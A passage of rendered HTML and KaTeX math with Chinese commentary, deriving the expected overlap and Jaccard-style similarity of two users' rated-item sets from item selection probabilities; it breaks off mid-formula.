style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.1111em;vertical-align:-0.247em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-2.453em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span/></span></span></span></span></span></span></span></span></span></div>
<p>根据期望的线性性质，总和的期望等于期望的总和：</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>E</mi><mo stretchy="false">[</mo><mi mathvariant="normal">∣</mi><msub><mi mathvariant="script">I</mi><mi>A</mi></msub><mo>∩</mo><msub><mi mathvariant="script">I</mi><mi>B</mi></msub><mi mathvariant="normal">∣</mi><mo stretchy="false">]</mo><mo>=</mo><mi>E</mi><mrow><mo fence="true">[</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>M</mi></munderover><msub><mi>X</mi><mi>i</mi></msub><mo fence="true">]</mo></mrow><mo>=</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>M</mi></munderover><mi>E</mi><mo stretchy="false">[</mo><msub><mi>X</mi><mi>i</mi></msub><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">E[|\mathcal{I}_A \cap \mathcal{I}_B|] = E\left[ \sum_{i=1}^{M} X_i \right] = \sum_{i=1}^{M} E[X_i]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mopen">[</span><span class="mord">∣</span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">∩</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord">∣</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:3.106em;vertical-align:-1.2777em;"/><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.1667em;"/><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">[</span></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8283em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"/><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">M</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span/></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size4">]</span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:3.106em;vertical-align:-1.2777em;"/><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8283em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"/><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">M</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span/></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mopen">[</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">]</span></span></span></span></span></div>
<p>对于离散的指示变量，其期望值等于它取 1 时的概率：</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>E</mi><mo stretchy="false">[</mo><msub><mi>X</mi><mi>i</mi></msub><mo stretchy="false">]</mo><mo>=</mo><mn>1</mn><mo>⋅</mo><mi>P</mi><mo stretchy="false">(</mo><msub><mi>X</mi><mi>i</mi></msub><mo>=</mo><mn>1</mn><mo stretchy="false">)</mo><mo>+</mo><mn>0</mn><mo>⋅</mo><mi>P</mi><mo stretchy="false">(</mo><msub><mi>X</mi><mi>i</mi></msub><mo>=</mo><mn>0</mn><mo stretchy="false">)</mo><mo>=</mo><mi>P</mi><mo stretchy="false">(</mo><msub><mi>X</mi><mi>i</mi></msub><mo>=</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">E[X_i] = 1 \cdot P(X_i = 1) + 0 \cdot P(X_i = 0) = P(X_i = 1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mopen">[</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">0</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">1</span><span class="mclose">)</span></span></span></span></span></div>
<p>由于总共有 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span></span> 个物品，将所有物品“被共同选中”的概率累加起来，就得到了<strong>期望的交集大小</strong>：</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>E</mi><mo stretchy="false">[</mo><mi mathvariant="normal">∣</mi><msub><mi mathvariant="script">I</mi><mi>A</mi></msub><mo>∩</mo><msub><mi mathvariant="script">I</mi><mi>B</mi></msub><mi mathvariant="normal">∣</mi><mo stretchy="false">]</mo><mo>=</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>M</mi></munderover><msubsup><mi>P</mi><mi>i</mi><mn>2</mn></msubsup></mrow><annotation encoding="application/x-tex">E[|\mathcal{I}_A \cap \mathcal{I}_B|] = \sum_{i=1}^{M} P_i^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mopen">[</span><span class="mord">∣</span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">∩</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord">∣</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:3.106em;vertical-align:-1.2777em;"/><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8283em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"/><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">M</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span/></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-2.453em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span/></span></span></span></span></span></span></span></span></span></div>
<p>分母 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∥</mi><msub><mi mathvariant="script">I</mi><mi>A</mi></msub><mo>∪</mo><msub><mi mathvariant="script">I</mi><mi>B</mi></msub><mi mathvariant="normal">∥</mi></mrow><annotation encoding="application/x-tex">\| \mathcal{I}_A \cup \mathcal{I}_B \|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">∥</span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">∪</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord">∥</span></span></span></span></span> 是两人评分集合的并集大小，起到<strong>缩放</strong>的作用，将结果约束在 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0, 1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">1</span><span class="mclose">]</span></span></span></span></span> 之间。</p>
<p>因此，由于单个物品共享带来的相似度期望分数为：</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>S</mi><mrow><mi>s</mi><mi>i</mi><mi>n</mi><mi>g</mi><mi>l</mi><mi>e</mi></mrow></msub><mo>=</mo><mfrac><mrow><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>M</mi></munderover><msubsup><mi>P</mi><mi>i</mi><mn>2</mn></msubsup></mrow><mrow><mi mathvariant="normal">∥</mi><msub><mi mathvariant="script">I</mi><mi>A</mi></msub><mo>∪</mo><msub><mi mathvariant="script">I</mi><mi>B</mi></msub><mi mathvariant="normal">∥</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">S_{single} = \frac{\sum_{i=1}^{M} P_{i}^2}{\| \mathcal{I}_A \cup \mathcal{I}_B \|}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="mord mathnormal mtight">in</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">g</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">e</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.6069em;vertical-align:-0.936em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6709em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">∥</span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">∪</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord">∥</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.6897em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9812em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">M</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2997em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-2.4413em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2587em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.936em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span></span></span></span></span></div>
<p>为了计算<strong>总的平均相似度</strong>，需要把“共享 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi></mrow><annotation encoding="application/x-tex">t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6151em;"/><span class="mord mathnormal">t</span></span></span></span></span> 个物品”的所有可能性累加起来。</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>S</mi><mrow><mi>t</mi><mi>o</mi><mi>t</mi><mi>a</mi><mi>l</mi></mrow></msub><mo>=</mo><munderover><mo>∑</mo><mrow><mi>t</mi><mo>=</mo><mn>1</mn></mrow><mrow><mi>min</mi><mo>⁡</mo><mo stretchy="false">(</mo><msub><mi>N</mi><mi>A</mi></msub><mo separator="true">,</mo><msub><mi>N</mi><mi>B</mi></msub><mo stretchy="false">)</mo></mrow></munderover><mfrac><mrow><munderover><mo>∑</mo><mrow><msub><mi>i</mi><mn>1</mn></msub><mo>=</mo><mn>1</mn></mrow><mrow><mi>M</mi><mo>−</mo><mi>t</mi><mo>+</mo><mn>1</mn></mrow></munderover><munderover><mo>∑</mo><mrow><msub><mi>i</mi><mn>2</mn></msub><mo>=</mo><msub><mi>i</mi><mn>1</mn></msub><mo>+</mo><mn>1</mn></mrow><mrow><mi>M</mi><mo>−</mo><mi>t</mi><mo>+</mo><mn>2</mn></mrow></munderover><mo>⋯</mo><munderover><mo>∑</mo><mrow><msub><mi>i</mi><mi>t</mi></msub><mo>=</mo><msub><mi>i</mi><mrow><mi>t</mi><mo>−</mo><mn>1</mn></mrow></msub><mo>+</mo><mn>1</mn></mrow><mi>M</mi></munderover><mrow><mo fence="true">(</mo><munderover><mo>∏</mo><mrow><mi>k</mi><mo>=</mo><mn>1</mn></mrow><mi>t</mi></munderover><msubsup><mi>P</mi><msub><mi>i</mi><mi>k</mi></msub><mn>2</mn></msubsup><mo fence="true">)</mo></mrow></mrow><mrow><mi mathvariant="normal">∥</mi><msub><mi mathvariant="script">I</mi><mi>A</mi></msub><mo>∪</mo><msub><mi mathvariant="script">I</mi><mi>B</mi></msub><msup><mi mathvariant="normal">∥</mi><mi>t</mi></msup></mrow></mfrac></mrow><annotation encoding="application/x-tex">S_{total} = \sum_{t=1}^{\min(N_A, N_B)} \frac{\sum_{i_1=1}^{M-t+1} \sum_{i_2=i_1+1}^{M-t+2} \dots \sum_{i_t=i_{t-1}+1}^{M} \left( \prod_{k=1}^{t} P_{i_k}^2 \right)}{\| \mathcal{I}_A \cup \mathcal{I}_B \|^t}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">t</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:3.4571em;vertical-align:-1.2671em;"/><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.961em;"><span style="top:-1.8829em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"/><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.386em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mop mtight"><span class="mtight">m</span><span class="mtight">i</span><span class="mtight">n</span></span><span class="mopen mtight">(</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3567em;margin-left:-0.109em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1433em;"><span/></span></span></span></span></span><span class="mpunct mtight">,</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span 